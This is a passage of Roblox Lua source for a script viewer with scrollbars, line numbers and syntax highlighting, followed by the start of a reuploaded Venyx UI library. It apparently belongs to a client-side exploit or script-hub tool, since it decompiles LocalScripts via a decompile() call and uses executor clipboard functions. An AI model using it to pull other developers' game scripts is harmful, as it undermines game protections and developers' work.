					))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
			return Frame
		end

		function GripGraphic(size,dir,spacing,scaled,template)
			local Frame = Create('Frame',{
				Name = "Grip Graphic";
				BorderSizePixel = 0;
				Size = UDim2.new(0,size.x,0,size.y);
				Transparency = 1;
			})
			if not template then
				template = Instance.new("Frame")
				template.BorderSizePixel = 0
			end

			spacing = spacing or 2

			local scale
			if scaled then
				function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
			else
				function scale(p) return p end
			end

			if dir == 'Vertical' then
				for i=0,size.x-1,spacing do
					local t = template:Clone()
					t.Size = scale(UDim2.new(0,1,0,size.y))
					t.Position = scale(UDim2.new(0,i,0,0))
					t.Parent = Frame
				end
			elseif dir == nil or dir == 'Horizontal' then
				for i=0,size.y-1,spacing do
					local t = template:Clone()
					t.Size = scale(UDim2.new(0,size.x,0,1))
					t.Position = scale(UDim2.new(0,0,0,i))
					t.Parent = Frame
				end
			end

			return Frame
		end

		do
			local mt = {
				__index = {
					GetScrollPercent = function(self)
						return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
					end;
					CanScrollDown = function(self)
						return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
					end;
					CanScrollUp = function(self)
						return self.ScrollIndex > 0
					end;
					ScrollDown = function(self)
						self.ScrollIndex = self.ScrollIndex + self.PageIncrement
						self:Update()
					end;
					ScrollUp = function(self)
						self.ScrollIndex = self.ScrollIndex - self.PageIncrement
						self:Update()
					end;
					ScrollTo = function(self,index)
						self.ScrollIndex = index
						self:Update()
					end;
					SetScrollPercent = function(self,percent)
						self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
						self:Update()
					end;
				};
			}
			mt.__index.CanScrollRight = mt.__index.CanScrollDown
			mt.__index.CanScrollLeft = mt.__index.CanScrollUp
			mt.__index.ScrollLeft = mt.__index.ScrollUp
			mt.__index.ScrollRight = mt.__index.ScrollDown

			function ScrollBar(horizontal)
				-- create row scroll bar
				local ScrollFrame = Create('Frame',{
					Name = "ScrollFrame";
					Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
					Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
					BackgroundTransparency = 1;
					Create('ImageButton',{
						Name = "ScrollDown";
						Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
						Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
						BackgroundColor3 = ScrollStyles.Button;
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollUp";
						Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
						BackgroundColor3 = ScrollStyles.Button;
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollBar";
						Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
						Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
						AutoButtonColor = false;
						BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
						Create('ImageButton',{
							Name = "ScrollThumb";
							AutoButtonColor = false;
							Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
							BackgroundColor3 = ScrollStyles.Button;
							BorderColor3 = ScrollStyles.Border;
							--BorderSizePixel = 0;
						});
					});
				})

				local graphicTemplate = Create('Frame',{
					Name="Graphic";
					BorderSizePixel = 0;
					BackgroundColor3 = ScrollStyles.Border;
				})
				local graphicSize = ScrollBarWidth/2

				local ScrollDownFrame = ScrollFrame.ScrollDown
				local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
				ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollDownGraphic.Parent = ScrollDownFrame
				local ScrollUpFrame = ScrollFrame.ScrollUp
				local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
				ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollUpGraphic.Parent = ScrollUpFrame
				local ScrollBarFrame = ScrollFrame.ScrollBar
				local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
				do
					local size = ScrollBarWidth*3/8
					local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
					Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
					Decal.Parent = ScrollThumbFrame
				end

				local MouseDrag = Create('ImageButton',{
					Name = "MouseDrag";
					Position = UDim2.new(-0.25,0,-0.25,0);
					Size = UDim2.new(1.5,0,1.5,0);
					Transparency = 1;
					AutoButtonColor = false;
					Active = true;
					ZIndex = 10;
				})

				local Class = setmetatable({
					GUI = ScrollFrame;
					ScrollIndex = 0;
					VisibleSpace = 0;
					TotalSpace = 0;
					PageIncrement = 1;
				},mt)

				local UpdateScrollThumb
				if horizontal then
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
						if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
							ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.x
						ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
					end
				else
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
						if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
							ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.y
						ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
					end
				end

				local lastDown
				local lastUp
				local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
				local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

				local function Update()
					local t = Class.TotalSpace
					local v = Class.VisibleSpace
					local s = Class.ScrollIndex
					if v <= t then
						if s > 0 then
							if s + v > t then
								Class.ScrollIndex = t - v
							end
						else
							Class.ScrollIndex = 0
						end
					else
						Class.ScrollIndex = 0
					end

					if Class.UpdateCallback then
						if Class.UpdateCallback(Class) == false then
							return
						end
					end

					local down = Class:CanScrollDown()
					local up = Class:CanScrollUp()
					if down ~= lastDown then
						lastDown = down
						ScrollDownFrame.Active = down
						ScrollDownFrame.AutoButtonColor = down
						local children = ScrollDownGraphic:GetChildren()
						local style = down and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					if up ~= lastUp then
						lastUp = up
						ScrollUpFrame.Active = up
						ScrollUpFrame.AutoButtonColor = up
						local children = ScrollUpGraphic:GetChildren()
						local style = up and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					ScrollThumbFrame.Visible = down or up
					UpdateScrollThumb()
				end
				Class.Update = Update

				SetZIndexOnChanged(ScrollFrame)

				local scrollEventID = 0
				ScrollDownFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollDownFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollDown()
					wait(0.2) -- delay before auto scroll
					while scrollEventID == current do
						Class:ScrollDown()
						if not Class:CanScrollDown() then break end
						wait()
					end
				end)

				ScrollDownFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				ScrollUpFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollUpFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollUp()
					wait(0.2)
					while scrollEventID == current do
						Class:ScrollUp()
						if not Class:CanScrollUp() then break end
						wait()
					end
				end)

				ScrollUpFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				if horizontal then
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if x > ScrollThumbFrame.AbsolutePosition.x then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x > ScrollThumbFrame.AbsolutePosition.x then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				else
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if y > ScrollThumbFrame.AbsolutePosition.y then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y > ScrollThumbFrame.AbsolutePosition.y then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				end

				if horizontal then
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
							local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
							local bar_abs_one = bar_abs_pos + bar_drag
							x = x - mouse_offset
							x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
							x = x - bar_abs_pos
							Class:SetScrollPercent(x/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				else
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
							local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
							local bar_abs_one = bar_abs_pos + bar_drag
							y = y - mouse_offset
							y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
							y = y - bar_abs_pos
							Class:SetScrollPercent(y/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				end

				function Class:Destroy()
					ScrollFrame:Destroy()
					MouseDrag:Destroy()
					for k in pairs(Class) do
						Class[k] = nil
					end
					setmetatable(Class,nil)
				end

				Update()

				return Class
			end
		end

		-- End Scrollbar

		local scrollBar = ScrollBar(false)
		scrollBar.PageIncrement = 16
		Create(scrollBar.GUI,{
			Position = UDim2.new(1,0,0,0);
			Size = UDim2.new(0,ScrollBarWidth,1,0);
			Parent = editorGrid;
		})

		local scrollBarH = ScrollBar(true)
		scrollBarH.PageIncrement = 8
		Create(scrollBarH.GUI,{
			Position = UDim2.new(0,0,1,0);
			Size = UDim2.new(1,0,0,ScrollBarWidth);
			Parent = editorGrid;
		})

		local entries = {}

		local grid = {}

		local count = 1
		local xCount = 1

		local lineSpan = 0

		for i = 0,490,8 do
			local newRow = {}
			for j = 0,390,16 do
				local cellText = Instance.new("TextLabel",editorGrid)
				cellText.BackgroundTransparency = 1
				cellText.BorderSizePixel = 0
				cellText.Text = ""
				cellText.Position = UDim2.new(0,i,0,j)
				cellText.Size = UDim2.new(0,8,0,16)
				cellText.Font = Enum.Font.SourceSans
				cellText.FontSize = Enum.FontSize.Size18
				table.insert(newRow,cellText)
				xCount = xCount + 1
			end
			table.insert(grid,newRow)
			count = count + 1
			xCount = 1
		end

		local syntaxHighlightList = {
			{["Keyword"] = "for", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "local", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "if", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "then", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "do", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "while", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "end", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "function", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "string", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "table", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "game", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "workspace", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "return", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "break", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "elseif", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "in", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "pairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "ipairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true}
		}

		function checkMouseInGui(gui)
			if gui == nil then return false end
			local plrMouse = game.Players.LocalPlayer:GetMouse()
			local guiPosition = gui.AbsolutePosition
			local guiSize = gui.AbsoluteSize	

			if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
				return true
			else
				return false
			end
		end

		function AddZeros(num,reach)
			local toConvert = tostring(num)
			while #toConvert < reach do
				toConvert = " "..toConvert
			end
			return toConvert
		end

		function buildScript(source,xOff,yOff,override)
			local buildingRows = true
			local buildScr = source

			local totalLines = 0

			--print(xOff,yOff)

			if currentSource ~= source then
				currentSource = source
			end

			if override then
				currentSource = source
				entries = {}
				while buildingRows do
					local x,y = string.find(buildScr,"\n")
					if x and y then
						table.insert(entries,string.sub(buildScr,1,y))
						buildScr = string.sub(buildScr,y+1,string.len(buildScr))
					else
						buildingRows = false
						table.insert(entries,buildScr)
					end
				end
			end

			totalLines = #entries
			lineSpan = #tostring(totalLines)

			if lineSpan == 1 then lineSpan = 2 end

			local currentRow = 1
			local currentColumn = 2 + lineSpan

			local colorTime = 0
			local colorReplace = nil

			local inString = false

			local workingEntries = entries

	--[[
	for i,v in pairs(entries) do
		table.insert(workingEntries,v)
	end
	
	for i = 1,yOff do
		table.remove(workingEntries,1)
	end
	--]]

			local delayance = xOff

			for i = 1,#grid do
				for j = 1,#grid[i] do
					if i <= lineSpan then
						local newNum = AddZeros(yOff + j,lineSpan)
						local newDigit =  string.sub(newNum,i,i)
						if newDigit == " " then
							grid[i][j].Text = ""
						else
							grid[i][j].Text = newDigit
						end
						grid[i][j].BackgroundTransparency = 0
						grid[i][j].BackgroundColor3 = Color3.new(163/255, 162/255, 165/255)
						--grid[i][j].Font = Enum.Font.SourceSansBold
					elseif i == lineSpan + 1 then
						grid[i][j].Text = ""
						grid[i][j].BackgroundTransparency = 0
						grid[i][j].BackgroundColor3 = Color3.new(200/255, 200/255, 200/255)
						--grid[i][j].Font = Enum.Font.SourceSans
					else
						grid[i][j].Text = ""
						grid[i][j].BackgroundTransparency = 1
						--grid[i][j].Font = Enum.Font.SourceSans
					end
				end
			end

			while true do
				if currentRow > #workingEntries or currentRow > #grid[1] then break end
				local entry = workingEntries[currentRow+yOff]
				while string.len(entry) > 0 do
					if string.sub(entry,1,1) == "\t" then entry = "    "..string.sub(entry,2) end

					if currentColumn > #grid then break end

					if delayance == 0 then
						grid[currentColumn][currentRow].Text = string.sub(entry,1,1)
					end

					-- Coloring

					if not inString then
						for i,v in pairs(syntaxHighlightList) do
							if string.sub(entry,1,string.len(v["Keyword"])) == v["Keyword"] then
								if v["Independent"] then
									local outCheck = string.len(v["Keyword"])+1
									local outEntry = string.sub(entry,outCheck,outCheck)
									if not string.find(outEntry,"%w") then
										colorTime = string.len(v["Keyword"])
										colorReplace = v["Color"]
									end
								else
									colorTime = string.len(v["Keyword"])
									colorReplace = v["Color"]
								end
							end
						end
					end

					if string.sub(entry,1,1) == "\"" and string.match(entry,"\".+\"") then
						inString = true
						colorTime = string.len(string.match(entry,"\".+\""))
						colorReplace = Color3.new(170/255, 0, 1)
					end

					if colorTime > 0 then
						colorTime = colorTime - 1
						grid[currentColumn][currentRow].TextColor3 = colorReplace
						if colorTime == 0 then inString = false end
					else
						grid[currentColumn][currentRow].TextColor3 = Color3.new(0,0,0)
						inString = false
					end

					if delayance == 0 then
						currentColumn = currentColumn + 1
					else
						delayance = delayance - 1
					end
					entry = string.sub(entry,2,string.len(entry))
				end
				currentRow = currentRow + 1
				currentColumn = 2 + lineSpan
				colorTime = 0
				delayance = xOff
				inString = false
			end
		end

		function scrollBar.UpdateCallback(self)
			scrollBar.TotalSpace = #entries * 16
			scrollBar.VisibleSpace = editorGrid.AbsoluteSize.Y
			buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
		end

		function scrollBarH.UpdateCallback(self)
			scrollBarH.TotalSpace = (getLongestEntry(entries) + 1 + lineSpan) * 8
			scrollBarH.VisibleSpace = editorGrid.AbsoluteSize.X
			buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
		end

		function getLongestEntry(tab)
			local longest = 0
			for i,v in pairs(tab) do
				if string.len(v) > longest then
					longest = string.len(v)
				end
			end
			return longest
		end

		function openScript(scrObj)
			if scrObj:IsA("LocalScript") then
				scrObj.Archivable = true
				scrObj = scrObj:Clone()
				scrObj.Disabled = true
			end

			local scrName = scrObj.Name
			local scrSource = decompile(scrObj)

			table.insert(memoryScripts,{Name = scrName,Source = scrSource})

			local newTab = entryTemplate:Clone()
			newTab.Button.Text = scrName
			newTab.Position = UDim2.new(0,#scriptBar:GetChildren() * 100,0,0)
			newTab.Visible = true

			newTab.Button.MouseButton1Down:connect(function()
				for i,v in pairs(scriptBar:GetChildren()) do
					if v == newTab then
						editingIndex = i
						buildScript(memoryScripts[i].Source,0,0,true)
						scrollBar:ScrollTo(1)
						scrollBar:Update()
						scrollBarH:ScrollTo(1)
						scrollBarH:Update()
					end
				end
			end)

			newTab.Close.MouseButton1Click:connect(function()
				for i,v in pairs(scriptBar:GetChildren()) do
					if v == newTab then
						table.remove(memoryScripts,i)
						if editingIndex == i then
							editingIndex = #memoryScripts
							if editingIndex > 0 then
								buildScript(memoryScripts[#memoryScripts].Source,0,0,true)
							else
								buildScript("",0,0,true)
							end
						end

						scrollBar:ScrollTo(1)
						scrollBar:Update()
						scrollBarH:ScrollTo(1)
						scrollBarH:Update()

						for i2 = i,#scriptBar:GetChildren() do
							scriptBar:GetChildren()[i2].Position = scriptBar:GetChildren()[i2].Position + UDim2.new(0,-100,0,0)
						end
						if editingIndex > i then
							editingIndex = editingIndex - 1
						end
						newTab:Destroy()
					end
				end
			end)

			editingIndex = #memoryScripts
			buildScript(scrSource,0,0,true)

			newTab.Parent = scriptBar
		end

		function updateScriptBar()
			local entryCount = 0

			scriptBarLeft.Active = false
			scriptBarLeft.AutoButtonColor = false
			for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0.7
			end
			scriptBarRight.Active = false
			scriptBarRight.AutoButtonColor = false
			for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0.7
			end
			for i,v in pairs(scriptBar:GetChildren()) do
				if v.Position.X.Offset < 0 then
					scriptBarLeft.Active = true
					scriptBarLeft.AutoButtonColor = true
					for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
						v.BackgroundTransparency = 0
					end
				elseif v.Position.X.Offset >= 0 then
					entryCount = entryCount + 1
					if entryCount == 5 then
						scriptBarRight.Active = true
						scriptBarRight.AutoButtonColor = true
						for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
							v.BackgroundTransparency = 0
						end
					end
				end
			end
		end

		scriptBar.ChildAdded:connect(updateScriptBar)
		scriptBar.ChildRemoved:connect(updateScriptBar)

		scriptBarLeft.MouseButton1Click:connect(function()
			if scriptBarLeft.Active == false then return end
			for i,v in pairs(scriptBar:GetChildren()) do
				v.Position = v.Position + UDim2.new(0,100,0,0)
			end
			updateScriptBar()
		end)

		scriptBarRight.MouseButton1Click:connect(function()
			if scriptBarRight.Active == false then return end
			for i,v in pairs(scriptBar:GetChildren()) do
				v.Position = v.Position + UDim2.new(0,-100,0,0)
			end
			updateScriptBar()
		end)

		mouse.Button1Down:connect(function()
			if checkMouseInGui(editorGrid) then
				--print("LETS EDIT!")
			end
		end)

		openEvent.Event:connect(function(...)
			top.Visible = true
			local args = {...}
			if #args > 0 then
				openScript(args[1])
			end
		end)

		clipboardButton.MouseButton1Click:connect(function()
			if Clipboard and Clipboard.set then
				Clipboard.set(currentSource)
			elseif CopyString then
				CopyString(currentSource)
			end
		end)

		closeButton.MouseButton1Click:connect(function()
			top.Visible = false
		end)

--[[
local scr = script.Parent:WaitForChild("Scr")
local scr2 = script.Parent:WaitForChild("Scr2")
local scr3 = script.Parent:WaitForChild("Scr3")
local scr4 = script.Parent:WaitForChild("TOS")
local scr5 = script.Parent:WaitForChild("HW")
--]]

		buildScript("",0,0,true)
--[[
openScript(scr)
openScript(scr2)
openScript(scr3)
openScript(scr4)
openScript(scr5)
--]]

		scrollBar:Update()
		scrollBarH:Update()
	end)

	--moony
end
function mod:LoadFencing()
	-- venyx ui lib reuploaded by me
	-- init
	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()

	-- services
	local input = game:GetService("UserInputService")
	local run = game:GetService("RunService")
	local tween = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new

	-- additional
	local utility = {}

	-- themes
	local objects = {}
	local themes = {
		Background = Color3.fromRGB(24, 24, 24), 
		Glow = Color3.fromRGB(0, 0, 0), 
		Accent = Color3.fromRGB(10, 10, 10), 
		LightContrast = Color3.fromRGB(20, 20, 20), 
		DarkContrast = Color3.fromRGB(14, 14, 14),  
		TextColor = Color3.fromRGB(255, 255, 255)
	}

	do
		function utility:Create(instance, properties, children)
			local object = Instance.new(instance)

			for i, v in pairs(properties or {}) do
				object[i] = v

				if typeof(v) == "Color3" then -- save for theme changer later
					local theme = utility:Find(themes, v)

					if theme then
						objects[theme] = objects[theme] or {}
						objects[theme][i] = objects[theme][i] or setmetatable({}, {_mode = "k"})

						table.insert(objects[theme][i], object)
					end
				end
			end

			for i, module in pairs(children or {}) do
				module.Parent = object
			end

			return object
		end

		function utility:Tween(instance, properties, duration, ...)
			tween:Create(instance, tweeninfo(duration, ...), properties):Play()
		end

		function utility:Wait()
			run.RenderStepped:Wait()
			return true
		end

		function utility:Find(table, value) -- table.find doesn't work for dictionaries
			for i, v in  pairs(table) do
				if v == value then
					return i
				end
			end
		end

		function utility:Sort(pattern, values)
			local new = {}
			pattern = pattern:lower()

			if pattern == "" then
				return values
			end

			for i, value in pairs(values) do
				if tostring(value):lower():find(pattern) then
					table.insert(new, value)
				end
			end

			return new
		end

		function utility:Pop(object, shrink)
			local clone = object:Clone()

			clone.AnchorPoint = Vector2.new(0.5, 0.5)
			clone.Size = clone.Size - UDim2.new(0, shrink, 0, shrink)
			clone.Position = UDim2.new(0.5, 0, 0.5, 0)

			clone.Parent = object
			clone:ClearAllChildren()

			object.ImageTransparency = 1
			utility:Tween(clone, {Size = object.Size}, 0.2)

			spawn(function()
				wait(0.2)

				object.ImageTransparency = 0
				clone:Destroy()
			end)

			return clone
		end

		function utility:InitializeKeybind()
			self.keybinds = {}
			self.ended = {}

			input.InputBegan:Connect(function(key,proc)
				if self.keybinds[key.KeyCode] and not proc then
					for i, bind in pairs(self.keybinds[key.KeyCode]) do
						bind()
					end
				end
			end)

			input.InputEnded:Connect(function(key)
				if key.UserInputType == Enum.UserInputType.MouseButton1 then
					for i, callback in pairs(self.ended) do
						callback()
					end
				end
			end)
		end

		function utility:BindToKey(key, callback)

			self.keybinds[key] = self.keybinds[key] or {}

			table.insert(self.keybinds[key], callback)

			return {
				UnBind = function()
					for i, bind in pairs(self.keybinds[key]) do
						if bind == callback then
							table.remove(self.keybinds[key], i)
						end
					end
				end
			}
		end

		function utility:KeyPressed() -- yield until next key is pressed
			local key = input.InputBegan:Wait()

			while key.UserInputType ~= Enum.UserInputType.Keyboard	 do
				key = input.InputBegan:Wait()
			end

			wait() -- overlapping connection

			return key
		end

		function utility:DraggingEnabled(frame, parent)

			parent = parent or frame

			-- stolen from wally or kiriot, kek
			local dragging = false
			local dragInput, mousePos, framePos

			frame.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					dragging = true
					mousePos = input.Position
					framePos = parent.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)

			frame.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement then
					dragInput = input
				end
			end)

			input.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					local delta = input.Position - mousePos
					parent.Position  = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
				end
			end)

		end

		function utility:DraggingEnded(callback)
			table.insert(self.ended, callback)
		end

	end

	-- classes

	local library = {} -- main
	local page = {}
	local section = {}

	do
		library.__index = library
		page.__index = page
		section.__index = section

		-- new classes

		function library.new(title)
			local container = utility:Create("ScreenGui", {
				Name = title,
				Parent = game.Players.LocalPlayer.StarterGui
			}, {
				utility:Create("ImageLabel", {
					Name = "Main",
					BackgroundTransparency = 1,
					Position = UDim2.new(0.25, 0, 0.052435593, 0),
					Size = UDim2.new(0, 511, 0, 428),
					Image = "rbxassetid://4641149554",
					ImageColor3 = themes.Background,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(4, 4, 296, 296)
				}, {
					utility:Create("ImageLabel", {
						Name = "Glow",
						BackgroundTransparency = 1,
						Position = UDim2.new(0, -15, 0, -15),
						Size = UDim2.new(1, 30, 1, 30),
						ZIndex = 0,
						Image = "rbxassetid://5028857084",
						ImageColor3 = themes.Glow,
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(24, 24, 276, 276)
					}),
					utility:Create("ImageLabel", {
						Name = "Pages",
						BackgroundTransparency = 1,
						ClipsDescendants = true,
						Position = UDim2.new(0, 0, 0, 38),
						Size = UDim2.new(0, 126, 1, -38),
						ZIndex = 3,
						Image = "rbxassetid://5012534273",
						ImageColor3 = themes.DarkContrast,
						ScaleType = Enum.ScaleType.Slice,
						SliceCenter = Rect.new(4, 4, 296, 296)
					}, {
						utility:Create("ScrollingFrame", {
							Name = "Pages_Container",
							Active = true,
							BackgroundTransparency = 1,
							Position = UDim2.new(0, 0, 0, 10),
							Size = UDim2.new(1, 0, 1, -20),
							CanvasSize = UDim2.new(0, 0, 0, 314),
							ScrollBarThickness = 0
						}, {
							utility:Create("UIListLayout", {
